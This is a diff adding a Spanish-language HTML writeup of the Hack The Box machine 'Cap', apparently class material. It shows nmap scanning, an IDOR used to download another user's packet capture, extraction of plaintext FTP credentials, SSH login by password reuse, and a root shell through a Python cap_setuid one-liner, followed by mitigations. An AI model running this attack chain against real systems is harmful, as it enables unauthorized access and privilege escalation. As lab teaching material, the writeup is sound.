@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Cap — Writeup</title>
+<style>
+  :root{
+    --bg:#0b0f17; --panel:#111726; --panel-2:#0e1420; --border:#1e2a3d;
+    --fg:#e6edf7; --muted:#9fb0c7; --accent:#39d98a; --accent-2:#4aa3ff;
+    --code-bg:#0a0f18; --code-fg:#e6edf7; --code-muted:#7c93b2;
+    --flag-bg:#0f2a1c; --flag-br:#1f6b45;
+    --mono:"DejaVu Sans Mono",ui-monospace,Menlo,Consolas,monospace;
+    --display:"Segoe UI",system-ui,Roboto,Arial,sans-serif;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{margin:0;background:var(--bg);color:var(--fg);font-family:var(--display);line-height:1.6}
+  a{color:var(--accent-2);text-decoration:none}
+  a:hover{text-decoration:underline}
+  .wrap{display:grid;grid-template-columns:260px minmax(0,1fr);gap:0;max-width:1200px;margin:0 auto}
+
+  /* Sidebar */
+  nav.toc{position:sticky;top:0;align-self:start;height:100vh;overflow-y:auto;
+    padding:26px 14px;border-right:1px solid var(--border);background:var(--panel-2)}
+  .brand{display:flex;align-items:center;gap:10px;margin-bottom:2px}
+  .shield{width:26px;height:26px;border-radius:7px;flex:0 0 auto;
+    background:linear-gradient(135deg,var(--accent),var(--accent-2));
+    display:flex;align-items:center;justify-content:center;font-weight:800;color:#06120c;font-family:var(--mono);font-size:13px}
+  .brand b{font-family:var(--display);font-size:16px;letter-spacing:.2px}
+  nav.toc .sub{color:var(--muted);font-size:11px;margin:2px 0 16px 36px}
+  nav.toc ol{list-style:none;margin:0;padding:0;counter-reset:s}
+  nav.toc li a{display:block;color:var(--muted);padding:6px 8px;border-radius:7px;font-size:13px}
+  nav.toc li a:hover{background:var(--panel);color:var(--fg);text-decoration:none}
+  nav.toc .n{font-family:var(--mono);font-size:11px;color:var(--accent);margin-right:8px}
+
+  main{padding:34px 40px 60px}
+  .kicker{font-family:var(--mono);font-size:12px;letter-spacing:1.5px;text-transform:uppercase;color:var(--accent-2)}
+  h1{font-family:var(--display);font-size:clamp(28px,5vw,40px);line-height:1.08;margin:8px 0 12px}
+  .lede{color:var(--muted);font-size:16px;max-width:70ch;margin:0}
+  .meta{display:flex;flex-wrap:wrap;gap:8px;margin:16px 0 6px;font-family:var(--mono);font-size:12px}
+  .meta span{background:var(--panel);border:1px solid var(--border);border-radius:999px;padding:4px 11px;color:var(--muted)}
+
+  h2{font-family:var(--display);font-size:23px;margin:34px 0 4px;scroll-margin-top:14px}
+  .badge{display:inline-block;font-family:var(--mono);font-size:13px;font-weight:700;background:var(--accent-2);
+    color:#04121f;border-radius:7px;padding:2px 9px;margin-right:9px}
+  h3{font-family:var(--display);font-size:16px;margin:22px 0 6px;color:var(--fg)}
+  p{max-width:75ch}
+
+  .note,.warn,.tip{border-left:4px solid var(--accent-2);background:var(--panel);
+    padding:10px 14px;border-radius:0 8px 8px 0;margin:14px 0;font-size:14px;max-width:80ch}
+  .warn{border-left-color:#e0a33a}
+  .tip{border-left-color:var(--accent)}
+  .note b,.warn b,.tip b{color:var(--fg)}
+
+  /* Code blocks */
+  .cmd{position:relative;margin:12px 0;max-width:100%}
+  .cmd .bar{display:flex;align-items:center;justify-content:space-between;background:var(--code-bg);
+    color:var(--code-muted);border:1px solid var(--border);border-bottom:none;border-radius:10px 10px 0 0;
+    padding:7px 12px;font-family:var(--mono);font-size:11px;letter-spacing:.5px}
+  .cmd pre{margin:0;background:var(--code-bg);color:var(--code-fg);border:1px solid var(--border);
+    border-radius:0 0 10px 10px;padding:14px;overflow-x:auto;font-family:var(--mono);font-size:13px;line-height:1.55}
+  .cmd.plain pre{border-radius:10px}
+  .cmd pre code{white-space:pre}
+  .copy{font-family:var(--mono);font-size:11px;cursor:pointer;background:transparent;color:var(--code-muted);
+    border:1px solid var(--code-muted);border-radius:6px;padding:3px 9px}
+  .copy:hover{color:var(--code-fg);border-color:var(--code-fg)}
+  .copy.ok{color:var(--accent);border-color:var(--accent)}
+  .c-prompt{color:var(--accent)}
+  .c-cmt{color:var(--code-muted);font-style:italic}
+  .c-str{color:#f0b05a}
+  .c-key{color:#7ee0ff}
+  .c-out{color:var(--code-muted)}
+
+  .flag{display:flex;align-items:center;gap:10px;font-family:var(--mono);font-size:13px;background:var(--flag-bg);
+    border:1px dashed var(--flag-br);border-radius:9px;padding:10px 14px;margin:14px 0;max-width:80ch;word-break:break-all}
+  .flag .tag{background:var(--accent);color:#04120b;border-radius:5px;padding:1px 8px;font-weight:700;flex:0 0 auto}
+
+  table{width:100%;border-collapse:collapse;margin:14px 0;font-size:13px;max-width:900px}
+  .tblwrap{overflow-x:auto}
+  th,td{border:1px solid var(--border);padding:8px 10px;text-align:left;vertical-align:top}
+  th{color:var(--muted);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;background:var(--panel-2)}
+  td.k{font-family:var(--mono);color:var(--accent);white-space:nowrap}
+  td code,p code,li code{font-family:var(--mono);font-size:.9em;background:var(--panel-2);padding:1px 6px;border-radius:5px;border:1px solid var(--border)}
+  ul.clean{max-width:78ch}
+  .explain{background:var(--panel-2);border:1px solid var(--border);border-left:3px solid var(--accent);
+    border-radius:0 8px 8px 0;padding:10px 14px 10px 16px;margin:-2px 0 16px;max-width:82ch;font-size:13.5px}
+  .explain .eh{display:block;font-size:11px;letter-spacing:.5px;text-transform:uppercase;color:var(--accent);
+    font-family:var(--mono);margin-bottom:6px}
+  .explain ul{margin:0;padding-left:0;list-style:none}
+  .explain li{margin:3px 0;padding-left:16px;position:relative}
+  .explain li::before{content:"›";position:absolute;left:0;color:var(--accent);font-weight:700}
+  .explain code{background:var(--code-bg);color:var(--c-key,#7ee0ff);border-color:var(--border)}
+  footer{border-top:1px solid var(--border);margin-top:48px;padding-top:18px;color:var(--muted);font-size:13px}
+
+  @media (max-width:820px){
+    .wrap{grid-template-columns:1fr}
+    nav.toc{position:static;height:auto;border-right:none;border-bottom:1px solid var(--border)}
+    main{padding:22px 16px 48px}
+  }
+  @media print{
+    @page{size:A4;margin:12mm 10mm}
+    nav.toc,.copy{display:none !important}
+    .wrap{grid-template-columns:1fr;max-width:none}
+    main{padding:0}
+    body{background:#fff;color:#111}
+    a{color:inherit}
+    h2,h3,.cmd,.flag,table,.note,.warn,.tip{break-inside:avoid}
+    .cmd .bar{background:#f0f0f0;color:#333;border-color:#ccc}
+    .cmd pre{background:#f6f8fa;color:#111;border-color:#ccc;overflow:visible !important;font-size:9.5px !important;line-height:1.45}
+    .cmd pre code{white-space:pre-wrap !important;overflow-wrap:anywhere;word-break:break-all}
+    .c-prompt,.c-str,.c-key,.c-cmt,.c-out{color:#333 !important}
+    *{-webkit-print-color-adjust:exact;print-color-adjust:exact}
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <nav class="toc">
+    <div class="brand"><span class="shield">C</span><b>HTB · Cap</b></div>
+    <div class="sub">Hack The Box · Linux · Fácil</div>
+    <ol>
+      <li><a href="#intro"><span class="n">00</span> Introducción</a></li>
+      <li><a href="#prep"><span class="n">01</span> Preparación / VPN</a></li>
+      <li><a href="#recon"><span class="n">02</span> Reconocimiento (nmap)</a></li>
+      <li><a href="#web"><span class="n">03</span> Enumerar la web</a></li>
+      <li><a href="#idor"><span class="n">04</span> El fallo: IDOR</a></li>
+      <li><a href="#pcap"><span class="n">05</span> Credenciales en el PCAP</a></li>
+      <li><a href="#foothold"><span class="n">06</span> Foothold por SSH</a></li>
+      <li><a href="#privesc"><span class="n">07</span> PrivEsc: cap_setuid</a></li>
+      <li><a href="#resumen"><span class="n">08</span> Resumen de la cadena</a></li>
+      <li><a href="#defensa"><span class="n">09</span> Mitigaciones</a></li>
+    </ol>
+  </nav>
+
+  <main>
+    <div class="kicker">Writeup de clase · Hack The Box</div>
+    <h1>Cap — de un dashboard web a <span style="color:var(--accent)">root</span></h1>
+    <p class="lede">Resolución paso a paso: un panel web de monitorización de red con un <b>IDOR</b> permite descargar una captura de tráfico ajena; dentro viaja un login <b>FTP en texto plano</b>. Esas credenciales se reutilizan por <b>SSH</b>, y una <b>Linux capability</b> peligrosa (<code>cap_setuid</code> sobre Python) da root al instante.</p>
+
+    <div class="meta">
+      <span>SO: Ubuntu 20.04</span><span>Dificultad: Fácil</span>
+      <span>Servicios: FTP · SSH · HTTP</span><span>Técnicas: IDOR · sniffing · capabilities</span>
+    </div>
+
+    <div class="note"><b>Nota IP:</b> la IP de la máquina cambia en cada despliegue. En este writeup la máquina es <code>10.129.151.215</code> y el Kali atacante (tun0 de la VPN) es <code>10.10.15.193</code>. Los comandos usan la variable <code>$IP</code>. <b>Antes de nada, en la MISMA terminal</b> ejecuta <code>export IP=10.129.151.215</code> (pon la IP de tu máquina). Si abres una terminal nueva, vuelve a exportarla. <b>Si olvidas este paso, <code>$IP</code> queda vacío</b> y una URL como <code>http://$IP/capture</code> se convierte en <code>http:///capture</code> y falla.</div>
+
+    <!-- 00 -->
+    <section id="intro">
+      <h2><span class="badge">00</span> Introducción</h2>
+      <p>"Cap" es una máquina Linux de dificultad fácil de Hack The Box. La idea didáctica es encadenar cuatro fallos muy habituales en el mundo real:</p>
+      <ul class="clean">
+        <li><b>IDOR</b> (<i>Insecure Direct Object Reference</i>): la app numera los recursos y no comprueba de quién son, así que puedes pedir el recurso <code>0</code> y leer datos ajenos.</li>
+        <li><b>Protocolo en claro</b>: FTP transmite usuario y contraseña sin cifrar; quien capture el tráfico los ve.</li>
+        <li><b>Reutilización de credenciales</b>: la misma contraseña del FTP sirve para SSH.</li>
+        <li><b>Linux capability peligrosa</b>: el binario de Python tiene <code>cap_setuid</code>, que permite cambiar el UID a 0 (root) sin ser root.</li>
+      </ul>
+    </section>
+
+    <!-- 01 -->
+    <section id="prep">
+      <h2><span class="badge">01</span> Preparación y conexión VPN</h2>
+      <p>Hack The Box se accede por una VPN (OpenVPN). Conecta con tu fichero <code>.ovpn</code> y deja esa terminal abierta; se creará la interfaz <code>tun0</code> con tu IP de atacante.</p>
+      <div class="cmd" data-copy="sudo openvpn ~/Downloads/machines_us-1.ovpn">
+        <div class="bar"><span>conectar la VPN (deja la terminal abierta)</span><button class="copy" type="button">copiar</button></div>
+        <pre><code><span class="c-prompt">$</span> sudo openvpn ~/Downloads/machines_us-1.ovpn</code></pre>
+      </div>
+      <div class="explain"><span class="eh">Explicación</span><ul>
+        <li><code>sudo</code> — OpenVPN necesita privilegios para crear la interfaz de red virtual <code>tun0</code>.</li>
+        <li><code>openvpn</code> — cliente VPN que establece el túnel cifrado hacia el laboratorio.</li>
+        <li><code>~/Downloads/machines_us-1.ovpn</code> — tu fichero de configuración (certificados + servidor) que descargas de HTB.</li>
+      </ul></div>
+      <p>En otra terminal, comprueba que tienes <code>tun0</code> y que la máquina responde:</p>
+      <div class="cmd" data-copy="ip a show tun0 | grep inet
+export IP=10.129.151.215
+ping -c2 $IP">
+        <div class="bar"><span>verificar conectividad</span><button class="copy" type="button">copiar</button></div>
+        <pre><code><span class="c-prompt">$</span> ip a show tun0 | grep inet
+<span class="c-out">inet 10.10.15.193/23 ... scope global tun0</span>
+<span class="c-prompt">$</span> export IP=10.129.151.215
+<span class="c-prompt">$</span> ping -c2 $IP
+<span class="c-out">64 bytes from 10.129.151.215: icmp_seq=1 ttl=63 time=237 ms</span></code></pre>
+      </div>
+      <div class="explain"><span class="eh">Explicación</span><ul>
+        <li><code>export IP=10.129.151.215</code> — guarda la IP del objetivo en una variable para escribir <code>$IP</code> en el resto de comandos y no repetirla. <b>Debes ejecutarlo en la misma terminal</b> donde uses los comandos.</li>
+        <li><code>ip a show tun0</code> — muestra la configuración de la interfaz de la VPN; <code>grep inet</code> filtra solo las líneas con tu IP.</li>
+        <li><code>ping -c2 $IP</code> — envía <code>2</code> paquetes ICMP (<code>-c2</code>) para comprobar que la máquina está viva y medir latencia.</li>
+      </ul></div>
+      <div class="tip"><b>TTL ≈ 63:</b> un TTL cercano a 64 indica que el objetivo es Linux (Windows suele rondar 128). Pista rápida del sistema operativo.</div>
+    </section>
+
+    <!-- 02 -->
+    <section id="recon">
+      <h2><span class="badge">02</span> Reconocimiento con nmap</h2>
+      <p>Primero un barrido rápido de <b>todos</b> los puertos TCP (<code>-p-</code>) con SYN scan y alta tasa de envío, para saber qué está abierto:</p>
+      <div class="cmd" data-copy="sudo nmap -p- --open -sS --min-rate 5000 -n -Pn $IP -oG allPorts">
+        <div class="bar"><span>escaneo de todos los puertos</span><button class="copy" type="button">copiar</button></div>
+        <pre><code><span class="c-prompt">$</span> sudo nmap -p- --open -sS --min-rate 5000 -n -Pn $IP -oG allPorts
+<span class="c-out">21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http</span></code></pre>
+      </div>
+      <div class="explain"><span class="eh">Explicación de cada flag</span><ul>
+        <li><code>-p-</code> — escanea los <b>65535</b> puertos TCP (no solo los 1000 habituales).</li>
+        <li><code>--open</code> — muestra únicamente los puertos abiertos, ignora cerrados/filtrados.</li>
+        <li><code>-sS</code> — <i>SYN scan</i> (sigiloso y rápido): no completa la conexión TCP.</li>
+        <li><code>--min-rate 5000</code> — fuerza al menos 5000 paquetes/seg para acelerar el barrido.</li>
+        <li><code>-n</code> — no resuelve DNS (más rápido). <code>-Pn</code> — asume que el host está vivo y no hace ping previo.</li>
+        <li><code>-oG allPorts</code> — guarda la salida en formato <i>grepeable</i> en el fichero <code>allPorts</code>.</li>
+      </ul></div>
+      <p>Ahora versiones y scripts por defecto (<code>-sCV</code>) solo sobre los puertos abiertos:</p>
+      <div class="cmd" data-copy="sudo nmap -p21,22,80 -sCV -n -Pn $IP -oN services">
+        <div class="bar"><span>versiones y scripts</span><button class="copy" type="button">copiar</button></div>
+        <pre><code><span class="c-prompt">$</span> sudo nmap -p21,22,80 -sCV -n -Pn $IP -oN services
+<span class="c-out">21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
+80/tcp open  http    Gunicorn
+|_http-title: Security Dashboard</span></code></pre>
+      </div>
+      <div class="explain"><span class="eh">Explicación de cada flag</span><ul>
+        <li><code>-p21,22,80</code> — ahora escanea solo los puertos que ya sabemos abiertos (más rápido y preciso).</li>
+        <li><code>-sC</code> — lanza los <i>scripts por defecto</i> de nmap (NSE) para sacar información extra.</li>
+        <li><code>-sV</code> — detecta <b>versión</b> exacta de cada servicio (vsftpd 3.0.3, OpenSSH 8.2p1…).</li>
+        <li><code>-oN services</code> — guarda la salida en formato normal/legible en el fichero <code>services</code>.</li>
+      </ul></div>
+      <table>
+        <tr><th>Puerto</th><th>Servicio</th><th>Observación</th></tr>
+        <tr><td class="k">21</td><td>vsftpd 3.0.3</td><td>FTP. Probamos acceso anónimo (acabó denegado).</td></tr>
+        <tr><td class="k">22</td><td>OpenSSH 8.2p1</td><td>SSH. Sin creds todavía; lo guardamos para después.</td></tr>
+        <tr><td class="k">80</td><td>Gunicorn</td><td>App Python (Flask/Gunicorn) "Security Dashboard" &rarr; foco principal.</td></tr>
+      </table>
+      <div class="cmd plain" data-copy="curl -s ftp://anonymous:anonymous@$IP/   # &rarr; 530 Login incorrect (anónimo denegado)">
+        <div class="bar"><span>FTP anónimo (no funciona)</span><button class="copy" type="button">copiar</button></div>
+        <pre><code><span class="c-prompt">$</span> curl -s <span class="c-str">ftp://anonymous:anonymous@$IP/</span>
+<span class="c-out">530 Login incorrect.   # el acceso anónimo está deshabilitado</span></code></pre>
+      </div>
+      <div class="explain"><span class="eh">Explicación</span><ul>
+        <li><code>curl -s</code> — cliente HTTP/FTP en modo silencioso (<code>-s</code>, sin barra de progreso).</li>
+        <li><code>ftp://anonymous:anonymous@$IP/</code> — intenta listar el FTP con el usuario/clave <code>anonymous</code> (acceso invitado típico).</li>
+        <li>Respuesta <code>530</code> = login rechazado &rarr; el FTP no permite anónimos; necesitaremos credenciales reales (las sacaremos del PCAP).</li>
+      </ul></div>
+    </section>
+
+    <!-- 03 -->
+    <section id="web">
+      <h2><span class="badge">03</span> Enumerar la aplicación web</h2>
+      <p>El puerto 80 sirve un panel "Security Dashboard". En el menú lateral hay cuatro funciones:</p>
+      <table>
+        <tr><th>Ruta</th><th>Qué hace</th></tr>
+        <tr><td class="k">/</td><td>Dashboard (portada).</td></tr>
+        <tr><td class="k">/ip</td><td>Muestra la salida de <code>ifconfig</code> del servidor.</td></tr>
+        <tr><td class="k">/netstat</td><td>Muestra la salida de <code>netstat</code> (conexiones).</td></tr>
+        <tr><td class="k">/capture</td><td>"Security Snapshot": captura 5 s de tráfico con <code>tcpdump</code> y redirige a <code>/data/&lt;N&gt;</code>.</td></tr>
+      </table>
+      <p>Al pulsar <b>Security Snapshot</b>, el servidor hace una captura y te redirige a una URL numerada. Fíjate en el <code>Location</code> de la respuesta:</p>
+      <div class="cmd" data-copy="curl -s -o /dev/null -w '%{redirect_url}\n' http://$IP/capture">
+        <div class="bar"><span>lanzar captura y ver la redirección</span><button class="copy" type="button">copiar</button></div>
+        <pre><code><span class="c-prompt">$</span> curl -s -o /dev/null -w <span class="c-str">'%{redirect_url}\n'</span> http://$IP/capture
+<span class="c-out">http://10.129.151.215/data/1</span></code></pre>
+      </div>
+      <div class="explain"><span class="eh">Explicación</span><ul>
+        <li><code>-s</code> — modo silencioso.</li>
+        <li><code>-o /dev/null</code> — descarta el cuerpo de la respuesta (no nos interesa el HTML aquí).</li>
+        <li><code>-w '%{redirect_url}\n'</code> — imprime solo la URL de redirección (cabecera <code>Location</code>) que devuelve el servidor.</li>
+        <li>Resultado: vemos que <code>/capture</code> nos manda a <code>/data/1</code> &rarr; el recurso se identifica con un <b>número</b> (pista del IDOR).</li>
+      </ul></div>
+      <p>La página <code>/data/&lt;N&gt;</code> muestra estadísticas de la captura (nº de paquetes TCP/UDP…) y un botón <b>Download</b> que apunta a <code>/download/&lt;N&gt;</code>, el PCAP crudo.</p>
+      <div class="warn"><b>Callejón sin salida (importante contarlo en clase):</b> si solo lanzas <code>/capture</code> y descargas tu propia captura, el PCAP sale <b>vacío</b> (24 bytes, cero paquetes), porque en esos 5 s no pasa nada interesante por la red. Perseguir una tarea programada capturando una y otra vez no lleva a ningún sitio. La clave no es capturar <i>nuevo</i> tráfico, sino leer una captura <b>ya existente</b>.</div>
+    </section>
+
+    <!-- 04 -->
+    <section id="idor">
+      <h2><span class="badge">04</span> El fallo: IDOR en <code>/data/&lt;N&gt;</code></h2>
+      <p>La app identifica cada captura con un número que simplemente va incrementando (1, 2, 3…) y <b>no comprueba si esa captura es tuya</b>. Eso es un <b>IDOR</b>: podemos pedir cualquier índice. ¿Y qué hay en el índice <b>0</b>? Una captura que la propia máquina generó antes, con tráfico real.</p>
+      <div class="cmd" data-copy="curl -s http://$IP/download/0 -o cap0.pcap
+file cap0.pcap">
+        <div class="bar"><span>descargar la captura nº 0 (IDOR)</span><button class="copy" type="button">copiar</button></div>
+        <pre><code><span class="c-prompt">$</span> curl -s http://$IP/download/0 -o cap0.pcap
+<span class="c-prompt">$</span> file cap0.pcap
+<span class="c-out">cap0.pcap: pcap capture file ... (9935 bytes)   # &iexcl;esta s&iacute; tiene contenido!</span></code></pre>
+      </div>
+      <div class="explain"><span class="eh">Explicación</span><ul>
+        <li><code>curl ... /download/0</code> — pedimos la captura con índice <b>0</b> (la del IDOR) en vez de la nuestra.</li>
+        <li><code>-o cap0.pcap</code> — guarda el fichero descargado localmente como <code>cap0.pcap</code>.</li>
+        <li><code>file cap0.pcap</code> — identifica el tipo de fichero; confirma que es un <i>pcap</i> y que pesa ~9,9 KB (tiene tráfico, no está vacío).</li>
+      </ul></div>
+      <div class="note"><b>¿Por qué el 0?</b> Los índices de usuario empiezan en 1, así que el 0 es "anterior a todo": una captura de referencia que dejó el sistema. Al no validar la propiedad del recurso, el 0 (y cualquier número) es accesible para cualquiera.</div>
+    </section>
+
+    <!-- 05 -->
+    <section id="pcap">
+      <h2><span class="badge">05</span> Credenciales FTP dentro del PCAP</h2>
+      <p>FTP es un protocolo en texto plano: el usuario y la contraseña viajan tal cual. Abrimos la captura y filtramos por FTP. Con interfaz gráfica sería Wireshark (filtro <code>ftp</code>); por consola, con <code>tshark</code>:</p>
+      <div class="cmd" data-copy="tshark -r cap0.pcap -Y ftp -T fields -e ftp.request.command -e ftp.request.arg | grep -iE 'USER|PASS'">
+        <div class="bar"><span>extraer USER/PASS del FTP</span><button class="copy" type="button">copiar</button></div>
+        <pre><code><span class="c-prompt">$</span> tshark -r cap0.pcap -Y ftp -T fields \
+       -e ftp.request.command -e ftp.request.arg | grep -iE <span class="c-str">'USER|PASS'</span>
+<span class="c-out">USER    nathan
+PASS    Buck3tH4TF0RM3!</span></code></pre>
+      </div>
+      <div class="explain"><span class="eh">Explicación de cada parte</span><ul>
+        <li><code>tshark</code> — la versión de consola de Wireshark (analizador de paquetes).</li>
+        <li><code>-r cap0.pcap</code> — <i>read</i>: lee la captura desde el fichero en vez de la red en vivo.</li>
+        <li><code>-Y ftp</code> — filtro de visualización: muestra solo paquetes del protocolo <b>FTP</b>.</li>
+        <li><code>-T fields -e ftp.request.command -e ftp.request.arg</code> — saca en columnas el comando FTP y su argumento (p. ej. <code>USER nathan</code>).</li>
+        <li><code>| grep -iE 'USER|PASS'</code> — filtra solo las líneas de usuario y contraseña (<code>-i</code> ignora mayúsculas, <code>-E</code> regex).</li>
+      </ul></div>
+      <div class="tip"><b>Alternativa en Wireshark:</b> abre <code>cap0.pcap</code>, escribe <code>ftp</code> en el filtro, y mira los paquetes <code>Request: USER nathan</code> y <code>Request: PASS ...</code>. O clic derecho en un paquete &rarr; <i>Follow &rarr; TCP Stream</i> para ver toda la conversación.</div>
+      <div class="flag"><span class="tag">CREDS</span> nathan : Buck3tH4TF0RM3!</div>
+    </section>
+
+    <!-- 06 -->
+    <section id="foothold">
+      <h2><span class="badge">06</span> Foothold: acceso por SSH</h2>
+      <p>Aunque las credenciales son del FTP, muchos usuarios reutilizan la misma contraseña. Probamos <b>SSH</b> (más cómodo que FTP para trabajar) y entra:</p>
+      <div class="cmd" data-copy="sshpass -p 'Buck3tH4TF0RM3!' ssh -o StrictHostKeyChecking=no nathan@$IP">
+        <div class="bar"><span>login SSH como nathan</span><button class="copy" type="button">copiar</button></div>
+        <pre><code><span class="c-prompt">$</span> sshpass -p <span class="c-str">'Buck3tH4TF0RM3!'</span> ssh -o StrictHostKeyChecking=no nathan@$IP
+<span class="c-prompt">nathan@cap:~$</span> id
+<span class="c-out">uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)</span>
+<span class="c-prompt">nathan@cap:~$</span> cat user.txt
+<span class="c-out">6fe30695c8a458f0ac89d667b7a32b02</span></code></pre>
+      </div>
+      <div class="explain"><span class="eh">Explicación</span><ul>
+        <li><code>sshpass -p '...'</code> — pasa la contraseña a SSH de forma no interactiva (evita que te la pida por teclado).</li>
+        <li><code>ssh nathan@$IP</code> — abre sesión SSH como el usuario <code>nathan</code> en el objetivo.</li>
+        <li><code>-o StrictHostKeyChecking=no</code> — acepta la clave del host sin preguntar (cómodo en labs; en producción no es recomendable).</li>
+        <li><code>id</code> — confirma quién somos (uid 1001 nathan). <code>cat user.txt</code> — lee la primera flag.</li>
+      </ul></div>
+      <div class="flag"><span class="tag">USER</span> 6fe30695c8a458f0ac89d667b7a32b02</div>
+      <div class="tip"><b>Sin sshpass:</b> también puedes ejecutar <code>ssh nathan@$IP</code> y teclear la contraseña a mano. <code>sshpass</code> solo evita el prompt.</div>
+    </section>
+
+    <!-- 07 -->
+    <section id="privesc">
+      <h2><span class="badge">07</span> Escalada a root: capability <code>cap_setuid</code></h2>
+      <p>Enumeramos las <b>Linux capabilities</b>: permisos finos que da un binario sin necesidad de SUID completo. Buscamos binarios con capabilities asignadas:</p>
+      <div class="cmd" data-copy="getcap -r / 2>/dev/null">
+        <div class="bar"><span>buscar capabilities en todo el sistema</span><button class="copy" type="button">copiar</button></div>
+        <pre><code><span class="c-prompt">nathan@cap:~$</span> getcap -r / 2>/dev/null
+<span class="c-out">/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+...</span></code></pre>
+      </div>
+      <div class="explain"><span class="eh">Explicación</span><ul>
+        <li><code>getcap</code> — lista las <b>capabilities</b> asignadas a binarios (privilegios finos de root sin ser root).</li>
+        <li><code>-r /</code> — recursivo desde la raíz <code>/</code>: busca en todo el sistema de ficheros.</li>
+        <li><code>2>/dev/null</code> — descarta los errores de "permiso denegado" para ver solo los resultados útiles.</li>
+        <li>Hallazgo clave: <code>python3.8 = cap_setuid</code> &rarr; ese Python puede cambiar su UID a 0 (root).</li>
+      </ul></div>
+      <p><code>/usr/bin/python3.8</code> tiene <b><code>cap_setuid</code></b>. Esa capability permite al proceso <b>cambiar su UID a 0 (root)</b>. Como Python puede llamar a <code>os.setuid(0)</code> y luego abrir una shell, nos convertimos en root directamente:</p>
+      <div class="cmd" data-copy="/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)'">
+        <div class="bar"><span>obtener shell de root</span><button class="copy" type="button">copiar</button></div>
+        <pre><code><span class="c-prompt">nathan@cap:~$</span> /usr/bin/python3.8 -c <span class="c-str">'import os; os.setuid(0); os.system("/bin/bash")'</span>
+<span class="c-prompt">root@cap:~#</span> id
+<span class="c-out">uid=0(root) gid=1001(nathan) groups=1001(nathan)</span>
+<span class="c-prompt">root@cap:~#</span> cat /root/root.txt
+<span class="c-out">a40927ca90e65c54ad6c2ca4d35fc997</span></code></pre>
+      </div>
+      <div class="explain"><span class="eh">Explicación del one-liner</span><ul>
+        <li><code>python3.8 -c '...'</code> — ejecuta el código Python que va entre comillas, sin abrir un fichero.</li>
+        <li><code>import os</code> — carga el módulo del sistema operativo.</li>
+        <li><code>os.setuid(0)</code> — pone el UID del proceso a <b>0</b> (root). Solo funciona porque el binario tiene <code>cap_setuid</code>.</li>
+        <li><code>os.system("/bin/bash")</code> — lanza una shell <code>bash</code>, que ya se ejecuta como root.</li>
+        <li><code>cat /root/root.txt</code> — leemos la flag final de root.</li>
+      </ul></div>
+      <div class="flag"><span class="tag">ROOT</span> a40927ca90e65c54ad6c2ca4d35fc997</div>
+      <div class="note"><b>¿Por qué funciona?</b> Normalmente <code>setuid(0)</code> falla si no eres root. Pero <code>cap_setuid</code> le concede a ese binario justo ese privilegio. Python obedece, pone el UID efectivo a 0 y lanza <code>/bin/bash</code> ya como root. Referencia clásica: <a href="https://gtfobins.github.io/gtfobins/python/#capabilities">GTFOBins &rarr; python (capabilities)</a>.</div>
+    </section>
+
+    <!-- 08 -->
+    <section id="resumen">
+      <h2><span class="badge">08</span> Resumen de la cadena</h2>
+      <div class="tblwrap">
+      <table>
+        <tr><th>Fase</th><th>Detalle</th></tr>
+        <tr><td class="k">Recon</td><td>nmap &rarr; 21 FTP vsftpd 3.0.3, 22 SSH, 80 Gunicorn "Security Dashboard"</td></tr>
+        <tr><td class="k">Web</td><td>Panel con <code>/capture</code> &rarr; <code>/data/N</code> &rarr; <code>/download/N</code> (PCAP)</td></tr>
+        <tr><td class="k">Vuln</td><td><b>IDOR</b>: <code>/download/0</code> entrega una captura ajena con contenido</td></tr>
+        <tr><td class="k">Creds</td><td><code>tshark</code> sobre el PCAP &rarr; FTP en claro <code>nathan : Buck3tH4TF0RM3!</code></td></tr>
+        <tr><td class="k">Foothold</td><td>Reutilización de contraseña &rarr; SSH como <code>nathan</code> &rarr; user.txt</td></tr>
+        <tr><td class="k">PrivEsc</td><td><code>cap_setuid</code> en <code>python3.8</code> &rarr; <code>os.setuid(0)</code> &rarr; root</td></tr>
+      </table>
+      </div>
+    </section>
+
+    <!-- 09 -->
+    <section id="defensa">
+      <h2><span class="badge">09</span> Mitigaciones (lado defensa)</h2>
+      <ul class="clean">
+        <li><b>IDOR:</b> validar que el recurso pertenece al usuario autenticado antes de servirlo; usar identificadores no predecibles (UUID) no sustituye a la comprobación de autorización.</li>
+        <li><b>Protocolos en claro:</b> sustituir FTP por FTPS/SFTP; nunca transmitir credenciales sin cifrar por la red.</li>
+        <li><b>Reutilización de contraseñas:</b> contraseñas distintas por servicio y, a ser posible, autenticación por clave SSH en vez de contraseña.</li>
+        <li><b>Capabilities:</b> no asignar <code>cap_setuid</code> (ni SUID) a intérpretes como Python/Perl/Ruby; audítalo con <code>getcap -r /</code> de forma periódica.</li>
+      </ul>
+    </section>
+
+    <footer>
+      Writeup de clase · HTB "Cap" · Técnicas: IDOR, análisis de PCAP, reutilización de credenciales y abuso de Linux capabilities.
+      Las flags cambian en cada despliegue de la máquina.
+    </footer>
+  </main>
+</div>
+
+<script>
+  document.querySelectorAll('.cmd').forEach(function(block){
+    var btn = block.querySelector('.copy');
+    if(!btn) return;
+    btn.addEventListener('click', function(){
+      var txt = block.getAttribute('data-copy') || block.querySelector('pre').innerText;
+      navigator.clipboard.writeText(txt).then(function(){
+        var old = btn.textContent; btn.textContent = 'copiado ✓'; btn.classList.add('ok');
+        setTimeout(function(){ btn.textContent = old; btn.classList.remove('ok'); }, 1400);
+      });
+    });
+  });
+</script>
+</body>
+</html>
